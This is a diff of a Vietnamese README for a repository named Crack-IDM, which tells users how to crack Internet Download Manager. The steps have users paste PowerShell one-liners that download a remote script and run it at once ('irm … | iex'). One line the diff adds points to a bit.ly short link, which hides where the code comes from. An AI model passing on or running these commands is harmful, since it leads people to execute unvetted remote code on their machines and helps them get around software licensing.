@@ -34,10 +34,14 @@
   - ![image](https://github.com/BsNgChiThanh/Crack-IDM/assets/82578024/73f131a2-efd7-4c50-9a36-106b02d83fca)
   - Dán vào câu lệnh: **CD C:\Windows\System32** rồi enter
   - ![image](https://github.com/BsNgChiThanh/Crack-IDM/assets/82578024/cc4df65e-6cc1-47a1-a967-fe19d9983a26)
-  - Dán 1 trong 3 câu lệnh dưới đây:
+  - Dán 1 trong 4 câu lệnh dưới đây:
 
       ```php
-     iwr -useb https://raw.githubusercontent.com/BsNgChiThanh/Crack-IDM/IMP/idm.ps1 | iex
+     irm https://raw.githubusercontent.com/BsNgChiThanh/Crack-IDM/IMP/idm.ps1 | iex
+      ```
+
+      ```php
+      irm https://bit.ly/3RtTQJh | iex
       ```
 
       ```php
@@ -45,7 +49,7 @@
       ```
       
       ```php
-      iwr -useb https://raw.githubusercontent.com/ictcentervnn/CMD-WIN-IDM/main/idm.ps1 | iex
+      iwr https://raw.githubusercontent.com/ictcentervnn/CMD-WIN-IDM/main/idm.ps1 | iex
       ```
       
   - ![image](https://github.com/BsNgChiThanh/Crack-IDM/assets/82578024/cbb5b6a7-8f33-448b-ae33-5e8e1ce8a360)
